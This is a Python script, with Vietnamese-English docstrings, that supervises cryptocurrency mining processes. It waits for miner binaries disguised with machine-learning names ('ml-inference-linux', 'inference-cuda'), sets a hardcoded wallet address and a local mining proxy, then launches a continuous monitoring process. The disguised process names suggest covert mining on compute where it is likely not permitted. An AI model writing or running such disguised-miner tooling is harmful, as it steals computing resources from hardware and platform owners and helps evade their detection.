#!/usr/bin/env python3
"""
🔄 Auto Mining Monitor Integration
Tự động kích hoạt continuous mining monitor sau khi start_mining.py khởi động
"""

import time
import threading
import sys
import os
import subprocess
import psutil
from pathlib import Path

# Add current directory to path
sys.path.append('.')

class AutoMiningMonitor:
    """
    **Auto Mining Monitor** (trình giám sát khai thác tự động) - Tự động kích hoạt
    mining output capture sau khi mining processes được khởi tạo
    """
    
    def __init__(self, activation_delay=30):
        """
        Parameters:
        - activation_delay: Thời gian chờ (giây) sau khi start_mining.py khởi động
        """
        self.activation_delay = activation_delay
        self.monitoring_active = False
        self.monitor_process = None
        
    def wait_for_mining_processes(self, timeout=120):
        """
        **Wait for mining processes** (chờ các tiến trình khai thác) - CPU và GPU miners
        Returns: True nếu tìm thấy processes, False nếu timeout
        """
        print(f"🔍 Waiting for mining processes (timeout: {timeout}s)...")
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            cpu_processes = []
            gpu_processes = []
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'ml-inference' in proc.info['name']:
                        cpu_processes.append(proc.info['pid'])
                    elif 'inference-cuda' in proc.info['name']:
                        gpu_processes.append(proc.info['pid'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            if cpu_processes or gpu_processes:
                print(f"✅ Found mining processes: CPU={len(cpu_processes)}, GPU={len(gpu_processes)}")
                return True
            
            print(f"⏳ Still waiting... ({int(time.time() - start_time)}s)", end='\r')
            time.sleep(2)
        
        print(f"\n❌ Timeout: No mining processes found after {timeout}s")
        return False
    
    def setup_environment_variables(self):
        """**Setup required environment variables** (thiết lập biến môi trường cần thiết)"""
        env_vars = {
            'LOGS_DIR': './mining_environment/logs',
            'ML_COMMAND': './ml-inference-linux', 
            'MINING_SERVER_CPU': '127.0.0.1:4443',
            'MINING_WALLET_CPU': '412iMJt9Gtv8ZkNEoCF6o1QvTChU6vGqrQp1F4sPkVKjWNBaHBgVhLpEn2mHFMD5n43VBCzpAy6dKZjJ8MPU8E99RJdkqE4'
        }
        
        for key, value in env_vars.items():
            os.environ[key] = value
        
        print("✅ Environment variables configured")
    
    def start_continuous_monitor(self):
        """**Start continuous mining monitor** (khởi động monitor liên tục)"""
        try:
            # Setup environment variables
            self.setup_environment_variables()
            
            # Start continuous monitoring process
            cmd = ['python3', 'continuous_mining_monitor.py']
            
            print("🚀 Starting continuous mining monitor...")
            
            self.monitor_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            print(f"✅ Continuous monitor started (PID: {self.monitor_process.pid})")
            self.monitoring_active = True
            return True
            
        except Exception as e:
            print(f"❌ Failed to start continuous monitor: {e}")
            return False
    
    def auto_activate(self):
        """
        **Auto Activation Workflow** (quy trình kích hoạt tự động):
        1. Wait for initial delay
        2. Wait for mining processes
        3. Start continuous monitor
        """
        print(f"🕒 Auto Mining Monitor - Waiting {self.activation_delay}s for startup...")
        time.sleep(self.activation_delay)
        
        # Wait for mining processes to be available
        if not self.wait_for_mining_processes():
            print("❌ Cannot start monitor - no mining processes found")
            return False
        
        # Start continuous monitor
        if self.start_continuous_monitor():
            print("🎯 Auto Mining Monitor successfully activated!")
            return True
        else:
            print("❌ Auto Mining Monitor activation failed")
            return False
    
    def stop_monitor(self):
        """**Stop monitoring process** (dừng tiến trình giám sát)"""
        if self.monitor_process and self.monitor_process.poll() is None:
            print("🛑 Stopping continuous monitor...")
            self.monitor_process.terminate()
            
            # Wait for graceful shutdown
            try:
                self.monitor_process.wait(timeout=10)
                print("✅ Monitor stopped gracefully")
            except subprocess.TimeoutExpired:
                print("⚠️ Force killing monitor process...")
                self.monitor_process.kill()
                self.monitor_process.wait()
                print("✅ Monitor force stopped")
            
            self.monitoring_active = False
            self.monitor_process = None

def main():
    """**Auto Mining Monitor Main Function** (hàm chính của Auto Mining Monitor)"""
    print("🔄 Auto Mining Monitor Service Starting...")
    
    # Create monitor instance
    auto_monitor = AutoMiningMonitor(activation_delay=30)
    
    try:
        # Auto activate monitoring
        success = auto_monitor.auto_activate()
        
        if success:
            print("🎯 Auto Mining Monitor is running...")
            print("Press Ctrl+C to stop monitoring")
            
            # Keep running until interrupted
            while auto_monitor.monitoring_active:
                try:
                    time.sleep(5)
                    
                    # Check if monitor process is still alive
                    if auto_monitor.monitor_process and auto_monitor.monitor_process.poll() is not None:
                        print("⚠️ Monitor process ended unexpectedly")
                        break
                        
                except KeyboardInterrupt:
                    break
        
    except KeyboardInterrupt:
        print("\n🛑 Keyboard interrupt received")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
    finally:
        # Cleanup
        auto_monitor.stop_monitor()
        print("🔚 Auto Mining Monitor service ended")

if __name__ == "__main__":
    main()